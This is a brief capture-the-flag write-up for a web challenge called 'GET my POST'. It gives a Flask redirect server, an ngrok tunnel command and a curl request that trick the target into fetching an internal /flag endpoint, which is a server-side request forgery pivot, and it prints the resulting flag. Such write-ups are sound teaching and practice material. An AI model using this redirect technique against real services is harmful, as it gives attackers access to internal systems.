# GET my POST

We need to setup our own proxy that will redirect request with changed http method:
```py
from flask import Flask, redirect

app = Flask(__name__)

@app.route("/redirect", methods=["POST"])
def redirect_to_internal():
    return redirect("http://internal:5001/flag", code=303)

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5002)
```
Expose this proxy to the internet:
```bash
ngrok http 5002
```
Send an exploit request:
```bash
curl -X POST -H 'Content-Type: application/json' https://get-my-post.ecsc25.hack.cert.pl/submit -d '{"url": "https://8ff3-195-178-27-154.ngrok-free.app/redirect"}'
# ecsc25{indirect_route}
```